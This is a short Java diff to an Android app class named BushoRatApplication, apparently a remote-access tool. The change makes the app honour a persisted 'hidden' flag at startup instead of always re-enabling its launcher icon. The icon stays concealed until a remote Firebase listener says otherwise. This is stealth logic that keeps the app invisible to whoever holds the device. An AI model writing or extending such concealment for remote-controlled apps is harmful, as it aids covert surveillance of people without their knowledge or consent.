@@ -22,8 +22,17 @@ public class BushoRatApplication extends Application {
         FirebaseApp.initializeApp(this);
         FirebaseDatabase.getInstance().setPersistenceEnabled(true);
 
-        // Keep launcher openable; never block the main thread on Firebase here.
-        AppVisibilityHelper.getInstance(this).ensureLauncherComponentEnabled();
+        // Initialize visibility helper and apply persisted state.
+        // Do NOT force-enable the launcher — respect the persisted hidden state from SharedPreferences.
+        // If the app was hidden before, keep it hidden until Firebase listener confirms.
+        AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
+        if (!visibilityHelper.isAppHidden()) {
+            // Only enable if not hidden per persisted state
+            visibilityHelper.ensureLauncherComponentEnabled();
+        } else {
+            // App was hidden before — apply the persisted hidden state
+            Log.d(TAG, "App was hidden before, keeping it hidden until Firebase confirms");
+        }
         registerVisibilityAuthListener();
     }
 
